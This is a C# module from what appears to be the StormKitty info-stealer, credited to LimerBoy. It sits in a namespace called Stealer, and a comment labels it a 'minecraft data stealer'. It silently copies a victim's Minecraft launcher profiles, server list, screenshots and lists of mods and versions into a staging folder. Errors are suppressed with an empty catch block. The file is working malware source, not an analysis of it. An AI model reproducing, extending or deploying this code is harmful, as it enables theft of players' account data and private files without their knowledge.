/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using StormKitty;
using System.IO;

namespace Stealer // Shit
{
    internal sealed class Minecraft
    {
        private static string MinecraftPath = Path.Combine(Paths.appdata, ".minecraft");

        // Get installed versions
        private static void SaveVersions(string sSavePath)
        {
            foreach (string version in Directory.GetDirectories(Path.Combine(MinecraftPath, "versions")))
            {
                string name = new DirectoryInfo(version).Name;
                string size = Filemanager.DirectorySize(version) + " bytes";
                string date = Directory.GetCreationTime(version)
                    .ToString("yyyy-MM-dd h:mm:ss tt");

                File.AppendAllText(sSavePath + "\\versions.txt", $"VERSION: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
            }
        }

        // Get installed mods
        private static void SaveMods(string sSavePath)
        {
            foreach (string mod in Directory.GetFiles(Path.Combine(MinecraftPath, "mods")))
            {
                string name = Path.GetFileName(mod);
                string size = new FileInfo(mod).Length + " bytes";
                string date = File.GetCreationTime(mod)
                    .ToString("yyyy-MM-dd h:mm:ss tt");

                File.AppendAllText(sSavePath + "\\mods.txt", $"MOD: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
            }
        }

        // Get screenshots
        private static void SaveScreenshots(string sSavePath)
        {
            string[] screenshots = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
            if (screenshots.Length == 0) return;
            
            Directory.CreateDirectory(sSavePath + "\\screenshots");
            foreach (string screenshot in screenshots)
                File.Copy(screenshot, sSavePath + "\\screenshots\\" + Path.GetFileName(screenshot));
        }

        // Get servers
        private static void SaveServers(string sSavePath)
        {
            string servers = Path.Combine(MinecraftPath, "servers.dat");
            if (!File.Exists(servers)) return;
            File.Copy(servers, sSavePath + "\\servers.dat");
        }

        // Get profiles 
        private static void SaveProfiles(string sSavePath)
        {
            string profiles = Path.Combine(MinecraftPath, "launcher_profiles.json");
            if (!File.Exists(profiles)) return;
            File.Copy(profiles, sSavePath + "\\launcher_profiles.json");
        }

        // Run minecraft data stealer
        public static void SaveAll(string sSavePath)
        {
            if (!Directory.Exists(MinecraftPath)) return;

            try
            {
                Directory.CreateDirectory(sSavePath);
                SaveProfiles(sSavePath);
                SaveServers(sSavePath);
                SaveScreenshots(sSavePath);
                SaveMods(sSavePath);
                SaveVersions(sSavePath);
            }
            catch { }
        }


    }
}
